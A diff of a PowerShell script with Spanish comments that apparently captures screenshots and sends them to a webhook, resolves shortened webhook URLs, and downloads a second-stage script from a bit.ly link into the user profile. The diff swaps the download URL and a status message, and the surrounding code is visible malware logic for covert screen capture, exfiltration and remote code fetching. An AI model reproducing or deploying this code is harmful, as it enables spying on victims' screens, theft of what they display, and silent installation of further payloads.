@@ -4,7 +4,7 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!00!..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
 
 # Verificar si el archivo principal ya existe
 $syswPath = "$env:USERPROFILE\sysw.ps1"
@@ -16,7 +16,7 @@ if (!(Test-Path $syswPath)) {
 
 # Descargar el nuevo archivo
 $newFilePath = "$env:USERPROFILE\newFile.ps1"
-Invoke-WebRequest -Uri "https://bit.ly/497Zojh" -OutFile $newFilePath
+Invoke-WebRequest -Uri "https://bit.ly/3SDV1W2" -OutFile $newFilePath
 
 do {
     $Filett = "$env:temp\SC.png"
